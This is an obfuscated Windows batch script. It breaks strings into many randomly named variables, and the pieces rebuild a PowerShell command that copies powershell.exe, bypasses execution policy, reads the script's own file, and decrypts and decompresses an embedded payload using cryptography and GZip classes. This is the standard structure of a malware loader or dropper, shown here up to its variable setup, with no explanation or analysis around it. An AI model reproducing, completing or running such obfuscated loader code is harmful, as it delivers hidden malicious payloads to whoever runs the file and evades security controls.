@echo off
set "GNfYRNKOoO=y "
set "QkZSqTrQoH=ws"
set "FsJJiKyKop=po"
set "oIDzzmfxNZ=\v"
set "QwUELYgKkO=:\"
set "dxbLufXWQN=he"
set "yHFYxfalZi=1."
set "tckOCkxNyi=he"
set "oSchBobPmH= /"
set "tXxJrDPckb=ow"
set "qWGgQyaxSi=co"
set "ngguPoQvvQ=Po"
set "rEioxKRnju=do"
set "CsZKuBGqDf=st"
set "roUyZHgElY=s\"
set "YtnbsGObfB=Sy"
set "faazKmPSUi=we"
set "WqNnxFTtpK=.e"
set "zdaVIwrLPY=Wi"
set "eRBMBaKvrK=32"
set "UvRsnFlxyg=ll"
set "ZJHWaxYemz=py"
set "hlZBtkFImO=we"
set "ONXJzYojdy=\W"
set "MRkeUMjIvc=0\"
set "LgATvqecZi= C"
set "QjISykwNKA=nd"
set "GpXJdMQKuH=ll"
set "hbaIHQQiPw=rS"
set "HoANGCpkTR=em"
set "bPbgqKSzvQ=in"
set "EZypuxyzFN=rs"
set "lYfAlHYpeE=xe"
set "ApyISraTdZ=cd"
set "MrNYqECVZS= %~dp0"
set "AXtKTZHACn=comm"
set "touNfeDBDW=m(, "
set "NorNvlfJHl=Y, 0"
set "FDdAcYUWBJ=-joi"
set "hzOWPsBRJC=();$"
set "IhpUwmpSNp=.Cop"
set "oIIDugqykx=$VMQ"
set "gUUvfqVapa=Syst"
set "TAathJjxHj=qBiH"
set "lnEyXdlecz=nirt"
set "zztyHVronV=-Obj"
set "nIRdNVrsNX=form"
set "OwBGMLZxWx='gni"
set "JbQBykQAnJ=gZHP"
set "hMfFpThrcd=ispo"
set "dirptGdwJz=ment"
set "zTGkiSQRzO=:('g"
set "LgtSXAgFWN=y.Pa"
set "wYMvKxOKES=();$"
set "uDHxItTxPJ=am.T"
set "pOxvHQYuzd=$kPf"
set "FpAugXxcCY=SSQo"
set "fHxUGGDgsn=RvX "
set "HOZZklxqwI=1] -"
set "PMqFWtDrtq=Disp"
set "jCxPPkOUEx=OyzA"
set "fhfCAEdnSy=stem"
set "mUerzhjMPZ=.Cry"
set "szXEsnyygh=Oc, "
set "mxIIrYZLQL=PfyY"
set "aCypAJdlGC=Stre"
set "itaxtzOFZS=bypa"
set "zPXmTYhUrT=in $"
set "AeiWPxnfXK=, (,"
set "tDpNeiyRJw= '')"
set "mWQehPdkMi=vj0m"
set "IyISogQpqF=ress"
set "qvfieSGSbg=mOc."
set "vmIlCOyySp=ptog"
set "NQReMnoNdZ=Obje"
set "mpeXyZGtoS=oin "
set "GMSPEcJvZj=pose"
set "SuUOofGTtW=[IO."
set "rNGLLNTFXI=; };"
set "JcWskmnYoB=t Sy"
set "orYqCbZzwS=.IO."
set "nvnEqJLTCs=ect "
set "HFkNJFQCcM=ZYYc"
set "QYKCnJDOio=).Sp"
set "DRfoAUZUxc=F'[-"
set "SyqLcuIngt=k; }"
set "GGZnqvteVm=.Cre"
set "BcCArdXyyX=B.Pa"
set "TEXCsteCHQ=vYW."
set "XYJtudLTRt=;$pM"
set "MSPJpdqcPm=ert]"
set "LicgRYmoxk=tem."
set "xKSjztMczi=ress"
set "cStWWdvMHN=ct S"
set "DCXvRDyenx=.Len"
set "rjnMNFWFEY=);$V"
set "nJqUCIaFOb=3); "
set "cqewsKTfoz=('%~f0'"
set "ryjuFUfBlw=.Cry"
set "hqzvxBHwXh=y.Cr"
set "vFkpuHxxOc=-ep "
set "ZMzvKFjrLl= [Sy"
set "ACkqLvpjoW=m.IO"
set "sPdwYBfRNy=brea"
set "GZRtPDNFwP=oUsj"
set "voNcymexLW=.Con"
set "nLrrpZIRDP=th('"
set "RRqDXFPDDV=em.C"
set "IEcPhJKUJy=Conv"
set "SostLwCnLS=$lZE"
set "bLuNDJJlTr=  $k"
set "ofNExLKhrT=m.IO"
